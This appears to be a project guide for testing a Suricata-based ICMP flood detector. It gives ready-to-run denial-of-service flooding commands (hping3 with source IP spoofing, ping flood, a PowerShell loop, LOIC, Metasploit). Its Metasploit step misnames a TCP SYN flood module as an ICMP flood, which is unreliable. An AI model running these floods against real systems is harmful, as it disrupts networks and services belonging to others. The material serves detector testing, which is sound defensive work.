# ICMP Flood Attack Testing Guide

This guide provides step-by-step instructions for generating ICMP flood attacks from Kali Linux and Windows systems to test the ICMP flood detection system.

## Prerequisites

- A Kali Linux machine or Windows machine with appropriate tools installed
- The target machine running Suricata and the ICMP flood detector
- Both machines on the same network or with network connectivity

## Testing from Kali Linux

### Method 1: Using hping3 (Recommended)

`hping3` is a powerful command-line packet crafting tool that can generate various types of network traffic, including ICMP floods.

1. **Install hping3** (if not already installed):
   ```bash
   sudo apt update
   sudo apt install hping3
   ```

2. **Launch an ICMP flood attack**:
   ```bash
   sudo hping3 -1 --flood -a [SPOOFED_IP] [TARGET_IP]
   ```
   
   Replace:
   - `[SPOOFED_IP]` with an optional source IP to spoof (or remove the `-a` flag to use your real IP)
   - `[TARGET_IP]` with the IP address of your target machine running Suricata

   Example:
   ```bash
   sudo hping3 -1 --flood 192.168.218.100
   ```

3. **Stop the attack** by pressing `Ctrl+C`

### Method 2: Using ping command

For a simpler but less powerful approach:

```bash
ping -f -s 1472 [TARGET_IP]
```

The `-f` flag enables flood mode, and `-s 1472` sets the packet size to maximum.

### Method 3: Using Metasploit

1. **Start Metasploit**:
   ```bash
   sudo msfconsole
   ```

2. **Use the ICMP flood auxiliary module**:
   ```
   use auxiliary/dos/tcp/synflood
   set RHOST [TARGET_IP]
   set SHOST [SPOOFED_IP]  # Optional
   run
   ```

## Testing from Windows

### Method 1: Using PowerShell

1. **Open PowerShell as Administrator**

2. **Create and run an ICMP flood script**:
   ```powershell
   $target = "[TARGET_IP]"
   $ping = New-Object System.Net.NetworkInformation.Ping
   
   for ($i = 0; $i -lt 10000; $i++) {
       $ping.Send($target, 1000, New-Object byte[] 65500)
       Write-Host "Sent packet $i"
   }
   ```

   Replace `[TARGET_IP]` with your target machine's IP address.

### Method 2: Using LOIC (Low Orbit Ion Cannon)

1. **Download LOIC** (Note: Use only in controlled environments and for testing purposes)

2. **Configure and launch attack**:
   - Enter the target IP in the URL field
   - Select "ICMP" as the attack method
   - Set threads to a high number (e.g., 10)
   - Click "IMMA CHARGIN MAH LAZER" to start the attack

### Method 3: Using CMD ping command

For a simple test:

```cmd
ping -t -l 65500 [TARGET_IP]
```

Open multiple command prompts and run this command in each to increase traffic volume.

## Monitoring the Attack

While running the attack, monitor the Suricata logs and ICMP flood detector output:

1. **Watch the eve.json log**:
   ```bash
   sudo tail -f /var/log/suricata/eve.json | grep ICMP
   ```

2. **Monitor the ICMP flood detector**:
   ```bash
   python3 src/icmp_flood_detector_suricata.py --eve-json /var/log/suricata/eve.json --tail --verbose
   ```

## Adjusting Detection Parameters

If the detector is not triggering alerts, you can adjust these parameters:

- `--threshold`: Lower this value (e.g., 5.0) to detect less aggressive floods
- `--window`: Increase this value (e.g., 10) to consider a longer time window
- `--cooldown`: Decrease this value to get more frequent alerts

Example:
```bash
python3 src/icmp_flood_detector_suricata.py --eve-json /var/log/suricata/eve.json --tail --threshold 5 --window 10 --cooldown 30 --verbose
```

## Safety and Legal Considerations

- Only perform these tests on networks and systems you own or have explicit permission to test
- Never target public or production systems
- These techniques are provided for educational and defensive testing purposes only

## Troubleshooting

1. **No ICMP packets in Suricata logs**:
   - Verify Suricata is properly configured to capture ICMP traffic
   - Check firewall rules that might be blocking ICMP
   - Ensure Suricata is monitoring the correct network interface

2. **Attack not detected**:
   - Increase verbosity with `--verbose` flag to see debug information
   - Lower the detection threshold
   - Verify the attack is generating sufficient traffic volume
